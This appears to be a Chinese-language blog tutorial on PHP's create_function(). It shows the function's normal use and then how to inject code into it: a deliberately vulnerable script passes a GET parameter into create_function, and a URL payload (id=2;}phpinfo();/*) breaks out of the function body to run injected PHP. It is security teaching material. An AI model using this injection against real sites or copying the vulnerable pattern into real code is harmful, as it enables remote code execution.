---
title: create_function
layout: post
category: php
author: 夏泽民
---
<!-- more -->
第一部分：介绍php函数 create_function()：

string create_function    ( string $args   , string $code   )

string $args 变量部分

string $code 方法代码部分

举例：
create_function('$fname','echo $fname."Zhang"')
类似于：
function fT($fname) {
  echo $fname."Zhang";
}

举一个官方提供的例子：
<?php
$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
echo "New anonymous function: $newfunc";
echo $newfunc(2, M_E) . "
";
// outputs
// New anonymous function: lambda_1
// ln(2) + ln(2.718281828459) = 1.6931471805599
?>
第二部分：如何利用create_function(）代码注入

测试环境版本：

apache +php 5.2、apache +php 5.3

有问题的代码：
<?php
//02-8.php?id=2;}phpinfo();/*
$id=$_GET['id'];
$str2='echo  '.$a.'test'.$id.";";
echo $str2;
echo "<br/>";
echo "==============================";
echo "<br/>";
$f1 = create_function('$a',$str2);
echo "<br/>";
echo "==============================";
?>
利用方法：

http://localhost/libtest/02-8.php?id=2;}phpinfo();/*


实现原理：

由于id=2;}phpinfo();/*

执行函数为：
源代码：
function fT($a) {
  echo "test".$a;
}
 
注入后代码：
function fT($a) {
  echo "test";}
  phpinfo();/*;//此处为注入代码。
}


测试效果：
实现在后台运行前端提交的php代码phpinfo();